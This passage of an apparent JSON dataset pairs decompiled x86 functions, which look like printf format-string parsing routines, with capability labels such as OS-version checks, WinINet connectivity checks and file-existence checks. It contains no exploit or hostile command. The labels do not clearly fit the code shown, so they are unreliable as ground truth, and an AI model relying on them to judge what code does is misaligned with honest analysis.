8);\n                                *(param_1 + 0x38) = 0;\n                                if (*(iVar6 + 0x14) == '\\0') {\n                                    fcn.00453bd0();\n                                }\n                                cVar4 = *(param_1 + 0x2d);\n                                iVar6 = fcn.00455ad2(**(iVar6 + 0xc), cVar4, 0x8000);\n                                ppiVar1 = param_1 + 0x448;\n                                if (iVar6 != 0) {\n                                    piVar3 = *ppiVar1;\n                                    if (piVar3[2] == piVar3[1]) {\n                                        if (*(piVar3 + 3) == '\\0') {\n                                            *(param_1 + 0x14) = 0xffffffff;\n                                        }\n                                        else {\n                                            *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                        }\n                                    }\n                                    else {\n                                        *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                        piVar3[2] = piVar3[2] + 1;\n                                        ***ppiVar1 = cVar4;\n                                        **ppiVar1 = **ppiVar1 + 1;\n                                    }\n                                    cVar4 = **(param_1 + 0xc);\n                                    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                                    *(param_1 + 0x2d) = cVar4;\n                                    if (cVar4 == '\\0') {\n                                        iVar6 = *(param_1 + 8);\n                                        *(iVar6 + 0x1c) = 1;\n                                        *(iVar6 + 0x18) = 0x16;\n                                        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                        iVar6 = *(param_1 + 8);\n                                        *(iVar6 + 0x1c) = 1;\n                                        *(iVar6 + 0x18) = 0x16;\n                                        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                        return 0xffffffff;\n                                    }\n                                }\n                                piVar3 = *ppiVar1;\n                                if (piVar3[2] == piVar3[1]) {\n                                    if (*(piVar3 + 3) == '\\0') {\n                                        *(param_1 + 0x14) = 0xffffffff;\n                                    }\n                                    else {\n                                        *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                    }\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                    piVar3[2] = piVar3[2] + 1;\n                                    ***ppiVar1 = cVar4;\n                                    **ppiVar1 = **ppiVar1 + 1;\n                                }\n                            }\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            cVar4 = *(param_1 + 0x2d);\n                            if (cVar4 == ' ') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (cVar4 == '#') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (cVar4 == '+') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (cVar4 == '-') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (cVar4 == '0') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (*(param_1 + 0x2d) != '*') {\n                                iVar6 = param_1 + 0x20;\ncode_r0x004499cf:\n                                cVar4 = fcn.00448909(iVar6);\n                                goto code_r0x00449a48;\n                            }\n                            cVar4 = fcn.004538fa();\n                            if (cVar4 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            cVar4 = fcn.0044ac28();\n                            if (cVar4 != '\\0') {\n                                if (*(param_1 + 0x20) < 0) {\n                                    *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                    *(param_1 + 0x20) = -*(param_1 + 0x20);\n                                }\ncode_r0x004499ff:\n                                cVar4 = '\\x01';\n                                goto code_r0x00449a48;\n                            }\n                            break;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (*(param_1 + 0x2d) != '*') {\n                                iVar6 = param_1 + 0x24;\n                                goto code_r0x004499cf;\n                            }\n                            cVar4 = fcn.00453d00();\n                            if (cVar4 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            cVar4 = fcn.0044ac28();\n                            if (cVar4 != '\\0') {\n                                if (*(param_1 + 0x24) < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x004499ff;\n                            }\n                            break;\n                        case 6:\n                            cVar4 = fcn.0044c987();\n                            goto code_r0x00449a48;\n                        case 7:\n                            cVar4 = fcn.0044e2a9(noname_0, arg_ch, arg_8h, unaff_EDI, unaff_ESI, unaff_EBX, var_4h, \n                                                 unaff_EBP, unaff_retaddr, param_2, param_3);\ncode_r0x00449a48:\n                            if (cVar4 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            break;\n                        default:\n                            iVar6 = *(param_1 + 8);\n                            *(iVar6 + 0x1c) = 1;\n                            *(iVar6 + 0x18) = 0x16;\n                            goto code_r0x00449833;\n                        case 0xbad1abe1:\n                            goto code_r0x00449846;\n                        }\n                        uVar2 = **(param_1 + 0xc);\n                        *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0x2d) = uVar2;\n                        var_4h = var_4h & 0xffffff00 | uVar2;\n                    } while (uVar2 != 0);\n                }\n                cVar4 = fcn.00454859();\n            } while (cVar4 != '\\0');\n        }\n    }\ncode_r0x00449846:\n    return 0xffffffff;\n}\n",
        "token_count": 2404
    },
    "00449afd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00449afd(uint32_t param_1, uint param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t arg_ch;\n    uint8_t *puVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint arg_8h;\n    uint arg_8h_00;\n    uchar auStack12 [3];\n    uint32_t var_5h;\n    uint var_1h;\n    \n    arg_8h_00 = *(param_1 + 8);\n    cVar3 = fcn.0045406b(arg_8h_00);\n    if (cVar3 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar5 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar5;\n            _auStack12 = param_1;\n            unique0x100002b3 = param_1;\n            do {\n                if (iVar5 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar4 = *puVar6;\n                puVar6 = puVar6 + 1;\n                stack0xfffffff8 = unique0x10000285 & 0xffffff | uVar4 << 0x18;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2d) = uVar4;\n                if (uVar4 != 0) {\n                    _auStack12 = _auStack12 & 0xffffff | uVar4 << 0x18;\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        arg_ch = *(param_1 + 0x18);\n                        arg_8h = CONCAT31(var_5h._1_3_, var_5h);\n                        uVar4 = fcn.00447ccd(arg_8h, arg_ch);\n                        *(param_1 + 0x18) = uVar4;\n                        if (7 < uVar4) {\n                            iVar5 = *(param_1 + 8);\n                            *(iVar5 + 0x1c) = 1;\n                            *(iVar5 + 0x18) = 0x16;\n                            goto code_r0x00449b32;\n                        }\n                        if (7 < uVar4) {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x449db1\n                        switch(uVar4) {\n                        case 0:\n                            iVar5 = *(param_1 + 8);\n                            *(param_1 + 0x38) = 0;\n                            if (*(iVar5 + 0x14) == '\\0') {\n                                fcn.00453bd0();\n                            }\n                            cVar3 = *(param_1 + 0x2d);\n                            unique0x10000227 = stack0xfffffff8 & 0xffffff;\n                            iVar5 = fcn.00455ad2(**(iVar5 + 0xc), cVar3, 0x8000);\n                            ppiVar1 = param_1 + 0x448;\n                            if (iVar5 != 0) {\n                                piVar2 = *ppiVar1;\n                                if (piVar2[2] == piVar2[1]) {\n                                    if (*(piVar2 + 3) == '\\0') {\n                                        *(param_1 + 0x14) = 0xffffffff;\n                                    }\n                                    else {\n                                        *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                    }\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                    piVar2[2] = piVar2[2] + 1;\n                                    ***ppiVar1 = cVar3;\n                                    **ppiVar1 = **ppiVar1 + 1;\n                                }\n                                cVar3 = **(param_1 + 0xc);\n                                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                                *(param_1 + 0x2d) = cVar3;\n                                if (cVar3 == '\\0') {\n                                    iVar5 = *(param_1 + 8);\n                                    *(iVar5 + 0x1c) = 1;\n                                    *(iVar5 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    iVar5 = *(param_1 + 8);\n                                    *(iVar5 + 0x1c) = 1;\n                                    *(iVar5 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    return 0xffffffff;\n                                }\n                            }\n                            piVar2 = *ppiVar1;\n                            if (piVar2[2] == piVar2[1]) {\n                                if (*(piVar2 + 3) == '\\0') {\n                                    *(param_1 + 0x14) = 0xffffffff;\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                }\n                            }\n                            else {\n                                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                piVar2[2] = piVar2[2] + 1;\n                                ***ppiVar1 = cVar3;\n                                **ppiVar1 = **ppiVar1 + 1;\n                            }\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            if (var_1h == ' ') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (var_1h == '#') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (var_1h == '+') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (var_1h == '-') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (var_1h == '0') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (var_1h != '*') {\n                                iVar5 = param_1 + 0x20;\n                                goto code_r0x00449cfe;\n                            }\n                            piVar2 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar2 + 1;\n                            iVar5 = *piVar2;\n                            *(param_1 + 0x20) = iVar5;\n                            if (iVar5 < 0) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                *(param_1 + 0x20) = -iVar5;\n                            }\ncode_r0x00449d23:\n                            cVar3 = '\\x01';\n                            goto code_r0x00449d5f;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (var_1h == '*') {\n                                piVar2 = *(param_1 + 0x10);\n                                *(param_1 + 0x10) = piVar2 + 1;\n                                iVar5 = *piVar2;\n                                *(param_1 + 0x24) = iVar5;\n                                if (iVar5 < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x00449d23;\n                            }\n                            iVar5 = param_1 + 0x24;\ncode_r0x00449cfe:\n                            cVar3 = fcn.00448981(iVar5);\n                            goto code_r0x00449d5f;\n                        case 6:\n                            cVar3 = fcn.0044cae0();\n                            goto code_r0x00449d5f;\n                        case 7:\n                            cVar3 = fcn.0044e617(arg_8h, arg_ch, arg_8h_00, unaff_EDI, unaff_ESI, unaff_EBX, _auStack12\n                                                 , stack0xfffffff8, unaff_EBP, unaff_retaddr, param_2);\ncode_r0x00449d5f:\n                            if (cVar3 == '\\0') {\n                                return 0xffffffff;\n                            }\n                        }\n                        uVar4 = **(param_1 + 0xc);\n                        puVar6 = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0xc) = puVar6;\n                        stack0xfffffff8 = stack0xfffffff8 & 0xffffff | uVar4 << 0x18;\n                        *(param_1 + 0x2d) = uVar4;\n                        _auStack12 = _auStack12 & 0xffffff | uVar4 << 0x18;\n                    } while (uVar4 != 0);\n                }\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar5 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar5 = *(param_1 + 8);\n        *(iVar5 + 0x1c) = 1;\n        *(iVar5 + 0x18) = 0x16;\ncode_r0x00449b32:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 2499
    },
    "00449dd1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00449dd1(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    uint16_t *puVar6;\n    uint32_t arg_8h;\n    \n    cVar3 = fcn.0045403a(*(param_1 + 8));\n    if (cVar3 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar5 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar5;\n            do {\n                if (iVar5 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar1 = *puVar6;\n                puVar6 = puVar6 + 1;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2e) = uVar1;\n                while ((uVar1 != 0 && (arg_8h = uVar1,  -1 < *(param_1 + 0x14)))) {\n                    uVar4 = fcn.00447d08(arg_8h, *(param_1 + 0x18));\n                    *(param_1 + 0x18) = uVar4;\n    // switch table (8 cases) at 0x449fcd\n                    switch(uVar4) {\n                    case 0:\n                        *(param_1 + 0x38) = 1;\n                        fcn.00454eb0(arg_8h, param_1 + 0x14, *(param_1 + 8));\n                        break;\n                    case 1:\n                        *(param_1 + 0x24) = 0xffffffff;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x1c) = 0;\n                        *(param_1 + 0x28) = 0;\n                        *(param_1 + 0x38) = 0;\n                        break;\n                    case 2:\n                        if (arg_8h == 0x20) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                        }\n                        else if (arg_8h == 0x23) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                        }\n                        else if (arg_8h == 0x2b) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                        }\n                        else if (arg_8h == 0x2d) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                        }\n                        else if (arg_8h == 0x30) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                        }\n                        break;\n                    case 3:\n                        if (uVar1 != 0x2a) {\n                            iVar5 = param_1 + 0x20;\n                            goto code_r0x00449f07;\n                        }\n                        piVar2 = *(param_1 + 0x10);\n                        *(param_1 + 0x10) = piVar2 + 1;\n                        iVar5 = *piVar2;\n                        *(param_1 + 0x20) = iVar5;\n                        if (iVar5 < 0) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            *(param_1 + 0x20) = -iVar5;\n                        }\ncode_r0x00449f2c:\n                        cVar3 = '\\x01';\n                        goto code_r0x00449f6a;\n                    case 4:\n                        *(param_1 + 0x24) = 0;\n                        break;\n                    case 5:\n                        if (uVar1 == 0x2a) {\n                            piVar2 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar2 + 1;\n                            iVar5 = *piVar2;\n                            *(param_1 + 0x24) = iVar5;\n                            if (iVar5 < 0) {\n                                *(param_1 + 0x24) = 0xffffffff;\n                            }\n                            goto code_r0x00449f2c;\n                        }\n                        iVar5 = param_1 + 0x24;\ncode_r0x00449f07:\n                        cVar3 = fcn.004489f9(iVar5);\n                        goto code_r0x00449f6a;\n                    case 6:\n                        cVar3 = fcn.0044cc39();\n                        goto code_r0x00449f6a;\n                    case 7:\n                        cVar3 = fcn.0044e976();\ncode_r0x00449f6a:\n                        if (cVar3 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        break;\n                    default:\n                        iVar5 = *(param_1 + 8);\n                        *(iVar5 + 0x1c) = 1;\n                        *(iVar5 + 0x18) = 0x16;\n                        goto code_r0x00449e01;\n                    case 0xbad1abe1:\n                        goto code_r0x00449e14;\n                    }\n                    uVar1 = **(param_1 + 0xc);\n                    puVar6 = *(param_1 + 0xc) + 1;\n                    *(param_1 + 0xc) = puVar6;\n                    *(param_1 + 0x2e) = uVar1;\n                }\n                if ((*(param_1 + 0x18) != '\\0') && (*(param_1 + 0x18) != '\\a')) break;\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar5 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar5 = *(param_1 + 8);\n        *(iVar5 + 0x18) = 0x16;\n        *(iVar5 + 0x1c) = 1;\ncode_r0x00449e01:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\ncode_r0x00449e14:\n    return 0xffffffff;\n}\n",
        "token_count": 1556
    },
    "00449fed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00449fed(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    uint arg_1ch;\n    \n    cVar3 = fcn.0045403a(*(param_1 + 8));\n    if (cVar3 != '\\0') {\n        if (*(param_1 + 0xc) == 0) {\n            iVar5 = *(param_1 + 8);\n            *(iVar5 + 0x1c) = 1;\n            *(iVar5 + 0x18) = 0x16;\n            arg_1ch = *(param_1 + 8);\ncode_r0x0044a029:\n            fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        }\n        else {\n            do {\n                cVar3 = fcn.00447a1b();\n                if (cVar3 == '\\0') {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar1 = **(param_1 + 0xc);\n                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                *(param_1 + 0x2e) = uVar1;\n                if (uVar1 != 0) {\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        uVar4 = fcn.00447d44(uVar1, *(param_1 + 0x18));\n                        *(param_1 + 0x18) = uVar4;\n                        cVar3 = fcn.00454487();\n                        if (cVar3 == '\\0') {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x44a221\n                        switch(*(param_1 + 0x18)) {\n                        case 0:\n                            cVar3 = fcn.0044acca();\n                            if (cVar3 == '\\0') {\n                                *(param_1 + 0x38) = 1;\n                                fcn.00454eb0(*(param_1 + 0x2e), param_1 + 0x14, *(param_1 + 8));\n                            }\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            iVar2 = *(param_1 + 0x2e);\n                            if (iVar2 == 0x20) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (iVar2 == 0x23) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (iVar2 == 0x2b) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (iVar2 == 0x2d) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (iVar2 == 0x30) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (*(param_1 + 0x2e) != 0x2a) {\n                                iVar5 = param_1 + 0x20;\ncode_r0x0044a139:\n                                cVar3 = fcn.00448a73(iVar5);\n                                goto code_r0x0044a1b7;\n                            }\n                            cVar3 = fcn.004539cf();\n                            if (cVar3 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            cVar3 = fcn.0044ac3e();\n                            if (cVar3 != '\\0') {\n                                if (*(param_1 + 0x20) < 0) {\n                                    *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                    *(param_1 + 0x20) = -*(param_1 + 0x20);\n                                }\ncode_r0x0044a169:\n                                cVar3 = '\\x01';\n                                goto code_r0x0044a1b7;\n                            }\n                            break;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (*(param_1 + 0x2e) != 0x2a) {\n                                iVar5 = param_1 + 0x24;\n                                goto code_r0x0044a139;\n                            }\n                            cVar3 = fcn.00453dd5();\n                            if (cVar3 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            cVar3 = fcn.0044ac3e();\n                            if (cVar3 != '\\0') {\n                                if (*(param_1 + 0x24) < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x0044a169;\n                            }\n                            break;\n                        case 6:\n                            cVar3 = fcn.0044cdc3();\n                            goto code_r0x0044a1b7;\n                        case 7:\n                            cVar3 = fcn.0044ecd4();\ncode_r0x0044a1b7:\n                            if (cVar3 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            break;\n                        default:\n                            iVar5 = *(param_1 + 8);\n                            *(iVar5 + 0x1c) = 1;\n                            *(iVar5 + 0x18) = 0x16;\n                            arg_1ch = *(param_1 + 8);\n                            goto code_r0x0044a029;\n                        case 0xbad1abe1:\n                            goto code_r0x0044a034;\n                        }\n                        uVar1 = **(param_1 + 0xc);\n                        *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0x2e) = uVar1;\n                    } while (uVar1 != 0);\n                }\n                cVar3 = fcn.00454913();\n            } while (cVar3 != '\\0');\n        }\n    }\ncode_r0x0044a034:\n    return 0xffffffff;\n}\n",
        "token_count": 1607
    },
    "0044a241": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044a241(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    uint16_t *puVar6;\n    uint32_t arg_8h;\n    \n    cVar3 = fcn.0045403a(*(param_1 + 8));\n    if (cVar3 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar5 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar5;\n            do {\n                if (iVar5 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar1 = *puVar6;\n                puVar6 = puVar6 + 1;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2e) = uVar1;\n                while ((uVar1 != 0 && (arg_8h = uVar1,  -1 < *(param_1 + 0x14)))) {\n                    uVar4 = fcn.00447d80(arg_8h, *(param_1 + 0x18));\n                    *(param_1 + 0x18) = uVar4;\n    // switch table (8 cases) at 0x44a431\n                    switch(uVar4) {\n                    case 0:\n                        *(param_1 + 0x38) = 1;\n                        fcn.00454eb0(arg_8h, param_1 + 0x14, *(param_1 + 8));\n                        break;\n                    case 1:\n                        *(param_1 + 0x24) = 0xffffffff;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x1c) = 0;\n                        *(param_1 + 0x28) = 0;\n                        *(param_1 + 0x38) = 0;\n                        break;\n                    case 2:\n                        if (arg_8h == 0x20) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                        }\n                        else if (arg_8h == 0x23) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                        }\n                        else if (arg_8h == 0x2b) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                        }\n                        else if (arg_8h == 0x2d) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                        }\n                        else if (arg_8h == 0x30) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                        }\n                        break;\n                    case 3:\n                        if (uVar1 != 0x2a) {\n                            iVar5 = param_1 + 0x20;\n                            goto code_r0x0044a377;\n                        }\n                        piVar2 = *(param_1 + 0x10);\n                        *(param_1 + 0x10) = piVar2 + 1;\n                        iVar5 = *piVar2;\n                        *(param_1 + 0x20) = iVar5;\n                        if (iVar5 < 0) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            *(param_1 + 0x20) = -iVar5;\n                        }\ncode_r0x0044a39c:\n                        cVar3 = '\\x01';\n                        goto code_r0x0044a3da;\n                    case 4:\n                        *(param_1 + 0x24) = 0;\n                        break;\n                    case 5:\n                        if (uVar1 == 0x2a) {\n                            piVar2 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar2 + 1;\n                            iVar5 = *piVar2;\n                            *(param_1 + 0x24) = iVar5;\n                            if (iVar5 < 0) {\n                                *(param_1 + 0x24) = 0xffffffff;\n                            }\n                            goto code_r0x0044a39c;\n                        }\n                        iVar5 = param_1 + 0x24;\ncode_r0x0044a377:\n                        cVar3 = fcn.00448aed(iVar5);\n                        goto code_r0x0044a3da;\n                    case 6:\n                        cVar3 = fcn.0044cf4d();\n                        goto code_r0x0044a3da;\n                    case 7:\n                        cVar3 = fcn.0044f041();\ncode_r0x0044a3da:\n                        if (cVar3 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        break;\n                    default:\n                        iVar5 = *(param_1 + 8);\n                        *(iVar5 + 0x1c) = 1;\n                        *(iVar5 + 0x18) = 0x16;\n                        goto code_r0x0044a271;\n                    case 0xbad1abe1:\n                        goto code_r0x0044a284;\n                    }\n                    uVar1 = **(param_1 + 0xc);\n                    puVar6 = *(param_1 + 0xc) + 1;\n                    *(param_1 + 0xc) = puVar6;\n                    *(param_1 + 0x2e) = uVar1;\n                }\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar5 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar5 = *(param_1 + 8);\n        *(iVar5 + 0x1c) = 1;\n        *(iVar5 + 0x18) = 0x16;\ncode_r0x0044a271:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\ncode_r0x0044a284:\n    return 0xffffffff;\n}\n",
        "token_count": 1522
    },
    "0044a451": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044a451(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint32_t arg_8h;\n    \n    cVar4 = fcn.0045409c(*(param_1 + 8));\n    if (cVar4 != '\\0') {\n        puVar7 = *(param_1 + 0xc);\n        if (puVar7 != NULL) {\n            iVar6 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar6;\n            do {\n                if (iVar6 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar2 = *puVar7;\n                puVar7 = puVar7 + 1;\n                *(param_1 + 0xc) = puVar7;\n                *(param_1 + 0x2e) = uVar2;\n                while ((uVar2 != 0 && (arg_8h = uVar2,  -1 < *(param_1 + 0x14)))) {\n                    uVar5 = fcn.00447dba(arg_8h, *(param_1 + 0x18));\n                    *(param_1 + 0x18) = uVar5;\n    // switch table (8 cases) at 0x44a671\n                    switch(uVar5) {\n                    case 0:\n                        *(param_1 + 0x38) = 1;\n                        ppiVar1 = param_1 + 0x448;\n                        piVar3 = *ppiVar1;\n                        if (piVar3[2] == piVar3[1]) {\n                            if (*(piVar3 + 3) == '\\0') {\n                                *(param_1 + 0x14) = 0xffffffff;\n                            }\n                            else {\n    